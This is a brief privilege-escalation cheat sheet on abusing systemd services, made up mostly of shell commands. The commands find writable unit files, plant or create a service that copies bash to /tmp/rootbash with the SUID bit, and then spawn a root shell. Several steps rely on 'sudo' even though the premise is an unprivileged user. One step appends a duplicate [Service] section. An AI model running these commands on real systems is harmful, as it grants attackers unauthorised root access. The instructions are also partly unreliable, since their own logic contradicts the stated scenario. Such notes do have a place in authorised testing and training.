# Abusing SystemD for Privilege Escalation

SystemD misconfigurations can lead to privilege escalation if users have write access to existing service files or can create new ones. By modifying or adding a malicious service, attackers can execute arbitrary commands as root.

## 1. Exploiting Writable SystemD Service Files

If a user has write permissions on a systemd service file that runs as root, they can modify it to execute arbitrary commands.

### Find writable service files:
```sh
find /etc/systemd/system/ -type f -writable 2>/dev/null
```

### Modify the service file:
```sh
echo -e "[Service]\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'" | sudo tee -a /etc/systemd/system/vulnerable.service
```

### Reload and restart the service:
```sh
sudo systemctl daemon-reload
sudo systemctl restart vulnerable.service
```

### Escalate privileges:
```sh
/tmp/rootbash -p
```

## 2. Creating a New SystemD Service

If a user can create a new service in `/etc/systemd/system/`:

### Create a malicious service file:
```sh
cat <<EOF > /tmp/root.service
[Unit]
Description=Root Shell

[Service]
Type=simple
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'

[Install]
WantedBy=multi-user.target
EOF
```

### Move and enable the service:
```sh
sudo mv /tmp/root.service /etc/systemd/system/root.service
sudo systemctl daemon-reload
sudo systemctl enable root.service
sudo systemctl start root.service
```

### Escalate privileges:
```sh
/tmp/rootbash -p
```

